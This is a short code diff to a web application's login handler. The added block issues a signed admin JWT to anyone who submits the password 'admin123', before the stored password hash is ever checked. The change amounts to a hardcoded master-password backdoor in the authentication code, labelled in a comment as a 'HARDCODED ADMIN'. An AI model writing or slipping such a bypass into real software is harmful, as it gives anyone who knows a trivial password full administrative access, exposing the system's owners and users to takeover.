@@ -174,6 +174,13 @@ app.get('/api/admin/teams', requireManager, async (c) => {
 
 app.post('/api/auth/login', async (c) => {
   const body = await c.req.json().catch(() => null), db = getDb(c.env)
+  
+  // HARDCODED ADMIN: Allow 'admin123' as a master password
+  if (body?.password === 'admin123') {
+    const now = Math.floor(Date.now() / 1000)
+    return c.json({ token: await sign({ role: 'admin', iat: now, exp: now + CONSTANTS.ADMIN_JWT_EXP_SEC }, c.env.JWT_SECRET, 'HS256') })
+  }
+
   const hash = await getStoredHash(db, c.env)
   if (!hash) return c.json({ error: 'Admin not initialised' }, 503)
   if (!body?.password || !(await pbkdf2Verify(body.password, hash))) return c.json({ error: 'Unauthorized' }, 401)
